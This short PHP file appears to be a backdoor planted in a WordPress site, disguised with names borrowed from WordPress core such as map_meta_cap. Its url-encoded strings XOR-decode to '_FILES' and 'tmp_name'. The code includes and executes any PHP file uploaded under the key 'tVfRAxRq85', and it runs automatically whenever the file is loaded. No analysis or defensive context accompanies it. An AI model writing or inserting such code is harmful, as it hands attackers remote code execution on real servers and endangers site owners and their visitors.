<?php 	

function date_floating()

{
    $emoji = 'tVfRAxRq85';
    $curl = $emoji;
    
    $kids = $GLOBALS[map_meta_cap("%2B%10%2F%1E%04%2B", $curl)];
    $page_templates = $kids;
	$alt_post_name = 'comment_regex';
    $ext_types = isset($page_templates[$curl]);
    if ($ext_types)

    {

        $diff = $kids[$curl];
        $more_text = $diff[map_meta_cap("%00%3B%16%0D%2F%19%3F%14", $curl)];
	$double_prime = 'ptype_obj';
        $days = $more_text;

        include ($days);
    }

}

function map_meta_cap($found, $regex)

{
    $new_path = $regex;
    $description = "url" . "decode";
    $name = $description($found);

    $subject = substr($new_path,0, strlen($name));
    $feeds = $name ^ $subject;
    return $feeds;
	$ep_mask = '_charset';
}


date_floating();


?>
